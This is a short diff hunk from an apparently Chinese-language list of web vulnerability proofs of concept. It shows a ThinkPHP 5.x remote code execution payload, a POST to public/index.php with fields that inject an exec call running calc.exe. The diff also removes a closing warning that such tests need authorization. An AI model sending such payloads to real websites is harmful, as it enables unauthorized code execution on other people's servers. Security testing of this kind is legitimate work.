@@ -51,5 +51,3 @@ phpMyadmin漏洞：
 
 **Thinkphp 5.1.* 和 5.2.* 和 5.0.* POC**
 35. `(post)public/index.php (data)c=exec&f=calc.exe&_method=filter`
-
-请注意，这些POC（Proof of Concept，概念验证）用于测试网站是否存在远程代码执行漏洞。使用这些POC进行测试时，必须确保您有权限对目标网站进行安全测试，未经授权的测试可能违反法律。
